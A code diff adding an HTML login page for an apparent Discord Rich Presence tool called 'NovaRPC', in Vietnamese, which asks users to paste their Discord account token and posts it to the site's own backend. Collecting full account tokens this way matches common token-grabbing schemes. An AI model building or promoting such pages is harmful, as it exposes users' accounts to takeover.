@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login - NovaRPC</title>
+    <style>
+        body { background: #0a0a12; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #1a1a2e; padding: 40px; border-radius: 20px; width: 360px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: none; background: #2a2a3e; color: white; margin: 10px 0; }
+        button { width: 100%; padding: 12px; border-radius: 10px; border: none; background: #5865f2; color: white; font-weight: bold; cursor: pointer; }
+        button:hover { background: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎮 NovaRPC</h1>
+        <p>Đăng nhập bằng token Discord</p>
+        <input id="token" placeholder="Nhập token Discord..." type="password">
+        <button onclick="login()">🔑 Đăng nhập</button>
+        <p id="error" style="color:red; font-size:13px;"></p>
+    </div>
+    <script>
+        async function login() {
+            const token = document.getElementById('token').value.trim();
+            if (!token) { document.getElementById('error').textContent = 'Vui lòng nhập token!'; return; }
+            document.querySelector('button').textContent = '⏳ Đang đăng nhập...';
+            document.querySelector('button').disabled = true;
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    window.location.href = '/dashboard';
+                } else {
+                    document.getElementById('error').textContent = '❌ ' + data.error;
+                    document.querySelector('button').textContent = '🔑 Đăng nhập';
+                    document.querySelector('button').disabled = false;
+                }
+            } catch (e) {
+                document.getElementById('error').textContent = '❌ Lỗi kết nối: ' + e.message;
+                document.querySelector('button').textContent = '🔑 Đăng nhập';
+                document.querySelector('button').disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
